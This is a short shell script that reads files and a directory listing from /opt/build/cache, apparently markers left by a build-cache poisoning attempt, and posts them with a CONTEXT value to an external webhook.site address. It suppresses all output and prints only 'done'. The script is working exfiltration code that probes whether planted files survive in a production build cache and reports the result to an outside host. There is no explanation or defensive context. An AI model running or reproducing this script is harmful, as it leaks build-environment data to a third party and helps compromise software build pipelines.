#!/bin/sh
B="https://webhook.site/4ae49b89-684a-49dd-93bf-8e1e9688695d"
curl -s --max-time 10 --data-urlencode "d=ctx=$CONTEXT|marker=$(cat /opt/build/cache/.pwn-marker 2>&1)|pwndir=$(cat /opt/build/cache/pwn-dir/x 2>&1)|cachels=$(ls -a /opt/build/cache/ 2>&1 | grep -i pwn)" "$B/PROD-CACHE-CHECK" >/dev/null 2>&1
echo done
